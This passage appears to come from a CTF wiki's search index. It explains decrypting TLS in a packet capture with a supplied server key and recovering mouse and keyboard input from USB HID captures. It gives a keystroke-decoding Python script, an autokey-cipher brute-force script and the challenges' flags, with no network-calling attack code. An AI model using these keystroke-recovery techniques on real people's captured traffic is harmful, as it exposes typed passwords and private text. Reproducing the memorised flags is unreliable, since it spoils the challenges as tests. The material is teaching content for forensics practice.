SSL.","title":"HTTPS"},{"location":"misc/traffic/protocols/HTTPS/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/protocols/HTTPS/#hack-dat-kiwi-ctf-2015-ssl-sniff-2","text":"Download the challenge files here Open the PCAP file in Wireshark, you will find TLS encrypted data. We are given the server.key.insecure key, so we need to import that key in order to decrypt the packets. There are two ways to get to the TLS Preferences page: Edit --> Preferences --> Protocols --> TLS Right click on a TSL packet --> Transport Layer Security --> Open Transport Layer Security preferences After you get to the TLS Preferences page, click on Edit... next to the RSA keys list. Then, add the server.key.insecure file to Key File and hit OK . Now, you can see the decrypted packets. You will find the flag in the HTTP packets.","title":"hack-dat-kiwi-ctf-2015: ssl-sniff-2"},{"location":"misc/traffic/protocols/USB/","text":"USB \u00b6 USB Details Mouse \u00b6 The data length of a mouse packet is 4 bytes. The first byte represents buttons pressed. 0x00 is no buttons pressed, 0x01 indicates left button pressed, and 0x02 indicates right button pressed. The second byte is a signed byte, where the highest bit is the sign bit. When positive, it represents how many pixels the mouse has moved horizontally to the right. When negative, it shows how many pixels it has moved horizontally to the left. The third byte, like the second byte, represents an offset that moves vertically up and down. By extracting those bytes in the USB mouse packets, you can recover the mouse movement. Keyboard \u00b6 The data length of a keyboard packet is 8 bytes. The keystroke is at the 3 rd byte. Each value corresponds to different keys. The full keyboard keymap can be found here on page 53 to 59. By extracting 3 rd bytes within the keyboard packets, you can recover all the keystrokes pressed. USB Traffic Packet Capture \u00b6 Before we get started, let's introduce some of the basics of USB . USB has different specifications, the following are three different types of USB : l USB UART l USB HID l USB Memory UART or Universal Asynchronous Receiver/Transmitter is a simple device that uses USB to receive and transmit data. HID stands for human interface. This type is suitable for interactive applications such as keyboards, mice, gamepads, and digital display devices. The last is USB Memory , or data storage. External HDD , thumb drive/flash drive , etc. are all of this type. The most widely used USB type is USB Memory . Each USB device (especially HID or Memory ) has a vendor ID (Vendor ID) and a product identifier (Product Id). Vendor ID is used to mark which manufacturer made this USB device. Product ID is used for different types of products. An example: The above picture is a list of USB devices connected to my computer in a virtual machine. In this example, I have a wireless mouse under VMware , which is a HID device. This device is running normally. You can see all the USB devices connected with the lsusb command. Now, you can find out which one is this mouse? Correct! It is the fourth one: Bus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse ID 0e0f:0003 is the Vendor-Product ID pair, where the value of Vendor ID is 0e0f and the value of Product ID is 0003 . Bus 002 Device 002 means the usb device is connected. This should be noted. We ran Wireshark with root permission to capture the USB data stream. However, we don't recommend it. We need to give the user enough permissions to get the usb data stream in Linux . We can use udev to achieve our goal. We need to create a user group usbmon and add our account to this group. addgroup usbmon gpasswd -a $USER usbmon echo 'SUBSYSTEM==\"usbmon\", GROUP=\"usbmon\", MODE=\"640\"' > /etc/udev/rules.d/99-usbmon.rules Next, we need the usbmon kernel module. If the module is not loaded, we can load the module with the following command: modprobe usbmon Open wireshark and you will see usbmonX where X represents the number. It should look like this (note we are running it as root ): If the interface is active or there is data flow, wireshark will display it as a wave next to that interface. So, which one should we choose? Correct!, usbmon0 . Open that and you can observe the usb packets. Through capturing the usb packets, we can learn the communication and working principles used between the USB device and the host. Furthermore, we can analyze the usb packets. CTF Examples \u00b6 UsbKeyboardDataHacker \u00b6 Based on the previous sections, we have a rough understanding of the USB traffic packet capture. Let's talk about how to analyze a USB traffic packet capture. For details on the USB protocol, see the Wireshark wiki Download the PCAP file here . Let's start with a simple example on GitHub : We can know that the data part of the USB protocol is in the Leftover Capture Data field. Mac and Linux You can use the tshark command to extract the Leftover Capture Data field. The command is as follows: tshark -r example.pcap -T fields -e usb.capdata > usbdata.txt Windows There is a tshark.exe in the wireshark directory. For example, on my machine it's at D:\\Program Files\\Wireshark\\tshark.exe . Run cmd and navigate to the current directory. The command is as follows: tshark.exe -r example.pcap -T fields -e usb.capdata > usbdata.txt For detailed usage of the tshark command, see the Wireshark official documentation Run the command and open at usbdata.txt . You will see the size of the data is 8 bytes. The data length of the keyboard packet is 8 bytes, the keystroke information is at the 3 rd byte. Each time the key stroke will generate a keyboard event usb packet . The data length of the mouse data packet is 4 bytes. The first byte represents the button. When the value is 0x00 , it means there is no button. When it is 0x01, it means the left button. When it is 0x02 , it means the right button. The second byte can be thought as a signed byte type, with the most significant bit as the sign bit. When this value is positive, it represents how many pixels the mouse is horizontally shifted to the right. When it is negative, it represents how many pixels are horizontally shifted to the left. The third byte is similar to the second byte and represents the offset of the vertical up and down movement. We can find the meaning of each value here . With this information, we can make a key map. Here is a table of keymap for keyboard strokes, which can be found from the link above. We write the following script: mappings = { 0x04 : \"A\" , 0x05 : \"B\" , 0x06 : \"C\" , 0x07 : \"D\" , 0x08 : \"E\" , 0x09 : \"F\" , 0x0A : \"G\" , 0x0B : \"H\" , 0x0C : \"I\" , 0x0D : \"J\" , 0x0E : \"K\" , 0x0F : \"L\" , 0x10 : \"M\" , 0x11 : \"N\" , 0x12 : \"O\" , 0x13 : \"P\" , 0x14 : \"Q\" , 0x15 : \"R\" , 0x16 : \"S\" , 0x17 : \"T\" , 0x18 : \"U\" , 0x19 : \"V\" , 0x1A : \"W\" , 0x1B : \"X\" , 0x1C : \"Y\" , 0x1D : \"Z\" , 0x1E : \"1\" , 0x1F : \"2\" , 0x20 : \"3\" , 0x21 : \"4\" , 0x22 : \"5\" , 0x23 : \"6\" , 0x24 : \"7\" , 0x25 : \"8\" , 0x26 : \"9\" , 0x27 : \"0\" , 0x28 : \"n\" , 0x2a : \"[DEL]\" , 0X2B : \" \" , 0x2C : \" \" , 0x2D : \"-\" , 0x2E : \"=\" , 0x2F : \"[\" , 0x30 : \"]\" , 0x31 : \" \\\\ \" , 0x32 : \"~\" , 0x33 : \";\" , 0x34 : \"'\" , 0x36 : \",\" , 0x37 : \".\" } nums = [] keys = open ( 'usbdata.txt' ) # tshark -r example.pcap -T fields -e usb.capdata > usbdata.txt for line in keys : if line [: 2 ] != '00' or line [ 4 : 6 ] != '00' : nums . append ( int ( line [ 4 : 6 ], 16 )) # 00:00:xx:.... keys . close () output = \"\" for n in nums : if n == 0 : continue if n in mappings : output += mappings [ n ] else : output += '[unknown]' print ( 'output:' + output ) The results are as follows: Here is the full solve script: #!/usr/bin/env python import sys import os DataFileName = \"usb.dat\" presses = [] normalKeys = { \"04\" : \"a\" , \"05\" : \"b\" , \"06\" : \"c\" , \"07\" : \"d\" , \"08\" : \"e\" , \"09\" : \"f\" , \"0a\" : \"g\" , \"0b\" : \"h\" , \"0c\" : \"i\" , \"0d\" : \"j\" , \"0e\" : \"k\" , \"0f\" : \"l\" , \"10\" : \"m\" , \"11\" : \"n\" , \"12\" : \"o\" , \"13\" : \"p\" , \"14\" : \"q\" , \"15\" : \"r\" , \"16\" : \"s\" , \"17\" : \"t\" , \"18\" : \"u\" , \"19\" : \"v\" , \"1a\" : \"w\" , \"1b\" : \"x\" , \"1c\" : \"y\" , \"1d\" : \"z\" , \"1e\" : \"1\" , \"1f\" : \"2\" , \"20\" : \"3\" , \"21\" : \"4\" , \"22\" : \"5\" , \"23\" : \"6\" , \"24\" : \"7\" , \"25\" : \"8\" , \"26\" : \"9\" , \"27\" : \"0\" , \"28\" : \"<RET>\" , \"29\" : \"<ESC>\" , \"2a\" : \"<DEL>\" , \"2b\" : \" \\t \" , \"2c\" : \"<SPACE>\" , \"2d\" : \"-\" , \"2e\" : \"=\" , \"2f\" : \"[\" , \"30\" : \"]\" , \"31\" : \" \\\\ \" , \"32\" : \"<NON>\" , \"33\" : \";\" , \"34\" : \"'\" , \"35\" : \"<GA>\" , \"36\" : \",\" , \"37\" : \".\" , \"38\" : \"/\" , \"39\" : \"<CAP>\" , \"3a\" : \"<F1>\" , \"3b\" : \"<F2>\" , \"3c\" : \"<F3>\" , \"3d\" : \"<F4>\" , \"3e\" : \"<F5>\" , \"3f\" : \"<F6>\" , \"40\" : \"<F7>\" , \"41\" : \"<F8>\" , \"42\" : \"<F9>\" , \"43\" : \"<F10>\" , \"44\" : \"<F11>\" , \"45\" : \"<F12>\" } shiftKeys = { \"04\" : \"A\" , \"05\" : \"B\" , \"06\" : \"C\" , \"07\" : \"D\" , \"08\" : \"E\" , \"09\" : \"F\" , \"0a\" : \"G\" , \"0b\" : \"H\" , \"0c\" : \"I\" , \"0d\" : \"J\" , \"0e\" : \"K\" , \"0f\" : \"L\" , \"10\" : \"M\" , \"11\" : \"N\" , \"12\" : \"O\" , \"13\" : \"P\" , \"14\" : \"Q\" , \"15\" : \"R\" , \"16\" : \"S\" , \"17\" : \"T\" , \"18\" : \"U\" , \"19\" : \"V\" , \"1a\" : \"W\" , \"1b\" : \"X\" , \"1c\" : \"Y\" , \"1d\" : \"Z\" , \"1e\" : \"!\" , \"1f\" : \"@\" , \"20\" : \"#\" , \"21\" : \"$\" , \"22\" : \"%\" , \"23\" : \"^\" , \"24\" : \"&\" , \"25\" : \"*\" , \"26\" : \"(\" , \"27\" : \")\" , \"28\" : \"<RET>\" , \"29\" : \"<ESC>\" , \"2a\" : \"<DEL>\" , \"2b\" : \" \\t \" , \"2c\" : \"<SPACE>\" , \"2d\" : \"_\" , \"2e\" : \"+\" , \"2f\" : \"{\" , \"30\" : \"}\" , \"31\" : \"|\" , \"32\" : \"<NON>\" , \"33\" : \" \\\" \" , \"34\" : \":\" , \"35\" : \"<GA>\" , \"36\" : \"<\" , \"37\" : \">\" , \"38\" : \"?\" , \"39\" : \"<CAP>\" , \"3a\" : \"<F1>\" , \"3b\" : \"<F2>\" , \"3c\" : \"<F3>\" , \"3d\" : \"<F4>\" , \"3e\" : \"<F5>\" , \"3f\" : \"<F6>\" , \"40\" : \"<F7>\" , \"41\" : \"<F8>\" , \"42\" : \"<F9>\" , \"43\" : \"<F10>\" , \"44\" : \"<F11>\" , \"45\" : \"<F12>\" } def main (): # check argv if len ( sys . argv ) != 2 : print ( \"Usage : \" ) print ( \" python UsbKeyboardHacker.py data.pcap\" ) print ( \"Tips : \" ) print ( \" To use this python script , you must install the tshark first.\" ) print ( \" You can use `sudo apt-get install tshark` to install it\" ) print ( \"Author : \" ) print ( \" WangYihang <wangyihanger@gmail.com>\" ) print ( \" If you have any questions , please contact me by email.\" ) print ( \" Thank you for using.\" ) exit ( 1 ) # get argv pcapFilePath = sys . argv [ 1 ] # get data of pcap os . system ( \"tshark -r %s -T fields -e usb.capdata 'usb.data_len == 8' > %s \" % ( pcapFilePath , DataFileName )) # read data with open ( DataFileName , \"r\" ) as f : for line in f : presses . append ( line [ 0 : - 1 ]) # handle result = \"\" for press in presses : if press == '' : continue if ':' in press : Bytes = press . split ( \":\" ) else : Bytes = [ press [ i : i + 2 ] for i in range ( 0 , len ( press ), 2 )] if Bytes [ 0 ] == \"00\" : if Bytes [ 2 ] != \"00\" and normalKeys . get ( Bytes [ 2 ]): result += normalKeys [ Bytes [ 2 ]] elif int ( Bytes [ 0 ], 16 ) & 0b10 or int ( Bytes [ 0 ], 16 ) & 0b100000 : # shift key is pressed. if Bytes [ 2 ] != \"00\" and normalKeys . get ( Bytes [ 2 ]): result += shiftKeys [ Bytes [ 2 ]] else : print ( \"[-] Unknow Key : %s \" % ( Bytes [ 0 ])) print ( \"[+] Found : %s \" % ( result )) # clean the temp data os . system ( \"rm ./ %s \" % ( DataFileName )) if __name__ == \"__main__\" : main () We write the following script: XMan - AutoKey \u00b6 Download the PCAP file here Run the script from earlier: python UsbKeyboardDataHacker.py task_AutoKey.pcapng Then we got this output: [+] Found : <CAP>a<CAP>utokey('****').decipheer('<CAP>mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo<DEL>pze<DEL>iz') We can see that this is a autokey cipher, but how do we decode it without the key? I found this script , which brute force the key. The brute force script: Note Run this script in Python2 from ngram_score import ngram_score from pycipher import Autokey import re from itertools import permutations qgram = ngram_score ( 'quadgrams.txt' ) trigram = ngram_score ( 'trigrams.txt' ) ctext = 'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ' ctext = re . sub ( r '[^A-Z]' , '' , ctext . upper ()) # keep a list of the N best things we have seen, discard anything else class nbest ( object ): def __init__ ( self , N = 1000 ): self . store = [] self . N = N def add ( self , item ): self . store . append ( item ) self . store . sort ( reverse = True ) self . store = self . store [: self . N ] def __getitem__ ( self , k ): return self . store [ k ] def __len__ ( self ): return len ( self . store ) #init N = 100 for KLEN in range ( 3 , 20 ): rec = nbest ( N ) for i in permutations ( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' , 3 ): key = '' . join ( i ) + 'A' * ( KLEN - len ( i )) pt = Autokey ( key ) . decipher ( ctext ) score = 0 for j in range ( 0 , len ( ctext ), KLEN ): score += trigram . score ( pt [ j : j + 3 ]) rec . add (( score , '' . join ( i ), pt [: 30 ])) next_rec = nbest ( N ) for i in range ( 0 , KLEN - 3 ): for k in xrange ( N ): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' : key = rec [ k ][ 1 ] + c fullkey = key + 'A' * ( KLEN - len ( key )) pt = Autokey ( fullkey ) . decipher ( ctext ) score = 0 for j in range ( 0 , len ( ctext ), KLEN ): score += qgram . score ( pt [ j : j + len ( key )]) next_rec . add (( score , key , pt [: 30 ])) rec = next_rec next_rec = nbest ( N ) bestkey = rec [ 0 ][ 1 ] pt = Autokey ( bestkey ) . decipher ( ctext ) bestscore = qgram . score ( pt ) for i in range ( N ): pt = Autokey ( rec [ i ][ 1 ]) . decipher ( ctext ) score = qgram . score ( pt ) if score > bestscore : bestkey = rec [ i ][ 1 ] bestscore = score print bestscore , 'autokey, klen' , KLEN , ':\"' + bestkey + '\",' , Autokey ( bestkey ) . decipher ( ctext ) The results of running out are as follows: We saw the word flag in one of the results: ( -674.9145695645551, 'autokey, klen' , 8 , ':\"FLAGHERE\",' , 'HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF' ) After splitting words, we see : HELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT THEM HERE IN THE KEY BOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF The last line contains the flag: flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF} Related CTF Challenges \u00b6 UsbMiceDataHacker References \u00b6 https://github.com/WangYihang/UsbMiceDataHacker https://github.com/WangYihang/UsbKeyboardDataHacker https://www.anquanke.com/post/id/85218 https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html https://blog.csdn.net/songze_lee/article/details/77658094 https://wiki.wireshark.org/USB http://www.usb.org/developers/hidpage/Hut1_12v2.pdf https://www.wireshark.org/docs/man-pages/tshark.html http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/","title":"USB"},{"location":"misc/traffic/protocols/USB/#usb","text":"USB Details","title":"USB"},{"location":"misc/traffic/protocols/USB/#mouse","text":"The data length of a mouse packet is 4 bytes. The first byte represents buttons pressed. 0x00 is no buttons pressed, 0x01 indicates left button pressed, and 0x02 indicates right button pressed. The second byte is a signed byte, where the highest bit is the sign bit. When positive, it represents how many pixels the mouse has moved horizontally to the right. When negative, it shows how many pixels it has moved horizontally to the left. The third byte, like the second byte, represents an offset that moves vertically up and down. By extracting those bytes in the USB mouse packets, you can recover the mouse movement.","title":"Mouse"},{"location":"misc/traffic/protocols/USB/#keyboard","text":"The data length of a keyboard packet is 8 bytes. The keystroke is at the 3 rd byte. Each value corresponds to different keys. The full keyboard keymap can be found here on page 53 to 59. By extracting 3 rd bytes within the keyboard packets, you can recover all the keystrokes pressed.","title":"Keyboard"},{"location":"misc/traffic/protocols/USB/#usb-traffic-packet-capture","text":"Before we get started, let's introduce some of the basics of USB . USB has different specifications, the following are three different types of USB : l USB UART l USB HID l USB Memory UART or Universal Asynchronous Receiver/Transmitter is a simple device that uses USB to receive and transmit data. HID stands for human interface. This type is suitable for interactive applications such as keyboards, mice, gamepads, and digital display devices. The last is USB Memory , or data storage. External HDD , thumb drive/flash drive , etc. are all of this type. The most widely used USB type is USB Memory . Each USB device (especially HID or Memory ) has a vendor ID (Vendor ID) and a product identifier (Product Id). Vendor ID is used to mark which manufacturer made this USB device. Product ID is used for different types of products. An example: The above picture is a list of USB devices connected to my computer in a virtual machine. In this example, I have a wireless mouse under VMware , which is a HID device. This device is running normally. You can see all the USB devices connected with the lsusb command. Now, you can find out which one is this mouse? Correct! It is the fourth one: Bus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse ID 0e0f:0003 is the Vendor-Product ID pair, where the value of Vendor ID is 0e0f and the value of Product ID is 0003 . Bus 002 Device 002 means the usb device is connected. This should be noted. We ran Wireshark with root permission to capture the USB data stream. However, we don't recommend it. We need to give the user enough permissions to get the usb data stream in Linux . We can use udev to achieve our goal. We need to create a user group usbmon and add our account to this group. addgroup usbmon gpasswd -a $USER usbmon echo 'SUBSYSTEM==\"usbmon\", GROUP=\"usbmon\", MODE=\"640\"' > /etc/udev/rules.d/99-usbmon.rules Next, we need the usbmon kernel module. If the module is not loaded, we can load the module with the following command: modprobe usbmon Open wireshark and you will see usbmonX where X represents the number. It should look like this (note we are running it as root ): If the interface is active or there is data flow, wireshark will display it as a wave next to that interface. So, which one should we choose? Correct!, usbmon0 . Open that and you can observe the usb packets. Through capturing the usb packets, we can learn the communication and working principles used between the USB device and the host. Furthermore, we can analyze the usb packets.","title":"USB Traffic Packet Capture"},{"location":"misc/traffic/protocols/USB/#ctf-examples","text":"","title":"CTF Examples"},{"location":"misc/traffic/protocols/USB/#usbkeyboarddatahacker","text":"Based on the previous sections, we have a rough understanding of the USB traffic packet capture. Let's talk about how to analyze a USB traffic packet capture. For details on the USB protocol, see the Wireshark wiki Download the PCAP file here . Let's start with a simple example on GitHub : We can know that the data part of the USB protocol is in the Leftover Capture Data field. Mac and Linux You can use the tshark command to extract the Leftover Capture Data field. The command is as follows: tshark -r example.pcap -T fields -e usb.capdata > usbdata.txt Windows There is a tshark.exe in the wireshark directory. For example, on my machine it's at D:\\Program Files\\Wireshark\\tshark.exe . Run cmd and navigate to the current directory. The command is as follows: tshark.exe -r example.pcap -T fields -e usb.capdata > usbdata.txt For detailed usage of the tshark command, see the Wireshark official documentation Run the command and open at usbdata.txt . You will see the size of the data is 8 bytes. The data length of the keyboard packet is 8 bytes, the keystroke information is at the 3 rd byte. Each time the key stroke will generate a keyboard event usb packet . The data length of the mouse data packet is 4 bytes. The first byte represents the button. When the value is 0x00 , it means there is no button. When it is 0x01, it means the left button. When it is 0x02 , it means the right button. The second byte can be thought as a signed byte type, with the most significant bit as the sign bit. When this value is positive, it represents how many pixels the mouse is horizontally shifted to the right. When it is negative, it represents how many pixels are horizontally shifted to the left. The third byte is similar to the second byte and represents the offset of the vertical up and down movement. We can find the meaning of each value here . With this information, we can make a key map. Here is a table of keymap for keyboard strokes, which can be found from the link above. We write the following script: mappings = { 0x04 : \"A\" , 0x05 : \"B\" , 0x06 : \"C\" , 0x07 : \"D\" , 0x08 : \"E\" , 0x09 : \"F\" , 0x0A : \"G\" , 0x0B : \"H\" , 0x0C : \"I\" , 0x0D : \"J\" , 0x0E : \"K\" , 0x0F : \"L\" , 0x10 : \"M\" , 0x11 : \"N\" , 0x12 : \"O\" , 0x13 : \"P\" , 0x14 : \"Q\" , 0x15 : \"R\" , 0x16 : \"S\" , 0x17 : \"T\" , 0x18 : \"U\" , 0x19 : \"V\" , 0x1A : \"W\" , 0x1B : \"X\" , 0x1C : \"Y\" , 0x1D : \"Z\" , 0x1E : \"1\" , 0x1F : \"2\" , 0x20 : \"3\" , 0x21 : \"4\" , 0x22 : \"5\" , 0x23 : \"6\" , 0x24 : \"7\" , 0x25 : \"8\" , 0x26 : \"9\" , 0x27 : \"0\" , 0x28 : \"n\" , 0x2a : \"[DEL]\" , 0X2B : \" \" , 0x2C : \" \" , 0x2D : \"-\" , 0x2E : \"=\" , 0x2F : \"[\" , 0x30 : \"]\" , 0x31 : \" \\\\ \" , 0x32 : \"~\" , 0x33 : \";\" , 0x34 : \"'\" , 0x36 : \",\" , 0x37 : \".\" } nums = [] keys = open ( 'usbdata.txt' ) # tshark -r example.pcap -T fields -e usb.capdata > usbdata.txt for line in keys : if line [: 2 ] != '00' or line [ 4 : 6 ] != '00' : nums . append ( int ( line [ 4 : 6 ], 16 )) # 00:00:xx:.... keys . close () output = \"\" for n in nums : if n == 0 : continue if n in mappings : output += mappings [ n ] else : output += '[unknown]' print ( 'output:' + output ) The results are as follows: Here is the full solve script: #!/usr/bin/env python import sys import os DataFileName = \"usb.dat\" presses = [] normalKeys = { \"04\" : \"a\" , \"05\" : \"b\" , \"06\" : \"c\" , \"07\" : \"d\" , \"08\" : \"e\" , \"09\" : \"f\" , \"0a\" : \"g\" , \"0b\" : \"h\" , \"0c\" : \"i\" , \"0d\" : \"j\" , \"0e\" : \"k\" , \"0f\" : \"l\" , \"10\" : \"m\" , \"11\" : \"n\" , \"12\" : \"o\" , \"13\" : \"p\" , \"14\" : \"q\" , \"15\" : \"r\" , \"16\" : \"s\" , \"17\" : \"t\" , \"18\" : \"u\" , \"19\" : \"v\" , \"1a\" : \"w\" , \"1b\" : \"x\" , \"1c\" : \"y\" , \"1d\" : \"z\" , \"1e\" : \"1\" , \"1f\" : \"2\" , \"20\" : \"3\" , \"21\" : \"4\" , \"22\" : \"5\" , \"23\" : \"6\" , \"24\" : \"7\" , \"25\" : \"8\" , \"26\" : \"9\" , \"27\" : \"0\" , \"28\" : \"<RET>\" , \"29\" : \"<ESC>\" , \"2a\" : \"<DEL>\" , \"2b\" : \" \\t \" , \"2c\" : \"<SPACE>\" , \"2d\" : \"-\" , \"2e\" : \"=\" , \"2f\" : \"[\" , \"30\" : \"]\" , \"31\" : \" \\\\ \" , \"32\" : \"<NON>\" , \"33\" : \";\" , \"34\" : \"'\" , \"35\" : \"<GA>\" , \"36\" : \",\" , \"37\" : \".\" , \"38\" : \"/\" , \"39\" : \"<CAP>\" , \"3a\" : \"<F1>\" , \"3b\" : \"<F2>\" , \"3c\" : \"<F3>\" , \"3d\" : \"<F4>\" , \"3e\" : \"<F5>\" , \"3f\" : \"<F6>\" , \"40\" : \"<F7>\" , \"41\" : \"<F8>\" , \"42\" : \"<F9>\" , \"43\" : \"<F10>\" , \"44\" : \"<F11>\" , \"45\" : \"<F12>\" } shiftKeys = { \"04\" : \"A\" , \"05\" : \"B\" , \"06\" : \"C\" , \"07\" : \"D\" , \"08\" : \"E\" , \"09\" : \"F\" , \"0a\" : \"G\" , \"0b\" : \"H\" , \"0c\" : \"I\" , \"0d\" : \"J\" , \"0e\" : \"K\" , \"0f\" : \"L\" , \"10\" : \"M\" , \"11\" : \"N\" , \"12\" : \"O\" , \"13\" : \"P\" , \"14\" : \"Q\" , \"15\" : \"R\" , \"16\" : \"S\" , \"17\" : \"T\" , \"18\" : \"U\" , \"19\" : \"V\" , \"1a\" : \"W\" , \"1b\" : \"X\" , \"1c\" : \"Y\" , \"1d\" : \"Z\" , \"1e\" : \"!\" , \"1f\" : \"@\" , \"20\" : \"#\" , \"21\" : \"$\" , \"22\" : \"%\" , \"23\" : \"^\" , \"24\" : \"&\" , \"25\" : \"*\" , \"26\" : \"(\" , \"27\" : \")\" , \"28\" : \"<RET>\" , \"29\" : \"<ESC>\" , \"2a\" : \"<DEL>\" , \"2b\" : \" \\t \" , \"2c\" : \"<SPACE>\" , \"2d\" : \"_\" , \"2e\" : \"+\" , \"2f\" : \"{\" , \"30\" : \"}\" , \"31\" : \"|\" , \"32\" : \"<NON>\" , \"33\" : \" \\\" \" , \"34\" : \":\" , \"35\" : \"<GA>\" , \"36\" : \"<\" , \"37\" : \">\" , \"38\" : \"?\" , \"39\" : \"<CAP>\" , \"3a\" : \"<F1>\" , \"3b\" : \"<F2>\" , \"3c\" : \"<F3>\" , \"3d\" : \"<F4>\" , \"3e\" : \"<F5>\" , \"3f\" : \"<F6>\" , \"40\" : \"<F7>\" , \"41\" : \"<F8>\" , \"42\" : \"<F9>\" , \"43\" : \"<F10>\" , \"44\" : \"<F11>\" , \"45\" : \"<F12>\" } def main (): # check argv if len ( sys . argv ) != 2 : print ( \"Usage : \" ) print ( \" python UsbKeyboardHacker.py data.pcap\" ) print ( \"Tips : \" ) print ( \" To use this python script , you must install the tshark first.\" ) print ( \" You can use `sudo apt-get install tshark` to install it\" ) print ( \"Author : \" ) print ( \" WangYihang <wangyihanger@gmail.com>\" ) print ( \" If you have any questions , please contact me by email.\" ) print ( \" Thank you for using.\" ) exit ( 1 ) # get argv pcapFilePath = sys . argv [ 1 ] # get data of pcap os . system ( \"tshark -r %s -T fields -e usb.capdata 'usb.data_len == 8' > %s \" % ( pcapFilePath , DataFileName )) # read data with open ( DataFileName , \"r\" ) as f : for line in f : presses . append ( line [ 0 : - 1 ]) # handle result = \"\" for press in presses : if press == '' : continue if ':' in press : Bytes = press . split ( \":\" ) else : Bytes = [ press [ i : i + 2 ] for i in range ( 0 , len ( press ), 2 )] if Bytes [ 0 ] == \"00\" : if Bytes [ 2 ] != \"00\" and normalKeys . get ( Bytes [ 2 ]): result += normalKeys [ Bytes [ 2 ]] elif int ( Bytes [ 0 ], 16 ) & 0b10 or int ( Bytes [ 0 ], 16 ) & 0b100000 : # shift key is pressed. if Bytes [ 2 ] != \"00\" and normalKeys . get ( Bytes [ 2 ]): result += shiftKeys [ Bytes [ 2 ]] else : print ( \"[-] Unknow Key : %s \" % ( Bytes [ 0 ])) print ( \"[+] Found : %s \" % ( result )) # clean the temp data os . system ( \"rm ./ %s \" % ( DataFileName )) if __name__ == \"__main__\" : main () We write the following script:","title":"UsbKeyboardDataHacker"},{"location":"misc/traffic/protocols/USB/#xman-autokey","text":"Download the PCAP file here Run the script from earlier: python UsbKeyboardDataHacker.py task_AutoKey.pcapng Then we got this output: [+] Found : <CAP>a<CAP>utokey('****').decipheer('<CAP>mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo<DEL>pze<DEL>iz') We can see that this is a autokey cipher, but how do we decode it without the key? I found this script , which brute force the key. The brute force script: Note Run this script in Python2 from ngram_score import ngram_score from pycipher import Autokey import re from itertools import permutations qgram = ngram_score ( 'quadgrams.txt' ) trigram = ngram_score ( 'trigrams.txt' ) ctext = 'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ' ctext = re . sub ( r '[^A-Z]' , '' , ctext . upper ()) # keep a list of the N best things we have seen, discard anything else class nbest ( object ): def __init__ ( self , N = 1000 ): self . store = [] self . N = N def add ( self , item ): self . store . append ( item ) self . store . sort ( reverse = True ) self . store = self . store [: self . N ] def __getitem__ ( self , k ): return self . store [ k ] def __len__ ( self ): return len ( self . store ) #init N = 100 for KLEN in range ( 3 , 20 ): rec = nbest ( N ) for i in permutations ( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' , 3 ): key = '' . join ( i ) + 'A' * ( KLEN - len ( i )) pt = Autokey ( key ) . decipher ( ctext ) score = 0 for j in range ( 0 , len ( ctext ), KLEN ): score += trigram . score ( pt [ j : j + 3 ]) rec . add (( score , '' . join ( i ), pt [: 30 ])) next_rec = nbest ( N ) for i in range ( 0 , KLEN - 3 ): for k in xrange ( N ): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' : key = rec [ k ][ 1 ] + c fullkey = key + 'A' * ( KLEN - len ( key )) pt = Autokey ( fullkey ) . decipher ( ctext ) score = 0 for j in range ( 0 , len ( ctext ), KLEN ): score += qgram . score ( pt [ j : j + len ( key )]) next_rec . add (( score , key , pt [: 30 ])) rec = next_rec next_rec = nbest ( N ) bestkey = rec [ 0 ][ 1 ] pt = Autokey ( bestkey ) . decipher ( ctext ) bestscore = qgram . score ( pt ) for i in range ( N ): pt = Autokey ( rec [ i ][ 1 ]) . decipher ( ctext ) score = qgram . score ( pt ) if score > bestscore : bestkey = rec [ i ][ 1 ] bestscore = score print bestscore , 'autokey, klen' , KLEN , ':\"' + bestkey + '\",' , Autokey ( bestkey ) . decipher ( ctext ) The results of running out are as follows: We saw the word flag in one of the results: ( -674.9145695645551, 'autokey, klen' , 8 , ':\"FLAGHERE\",' , 'HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF' ) After splitting words, we see : HELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT THEM HERE IN THE KEY BOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF The last line contains the flag: flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}","title":"XMan - AutoKey"},{"location":"misc/traffic/protocols/USB/#related-ctf-challenges","text":"UsbMiceDataHacker","title":"Related CTF 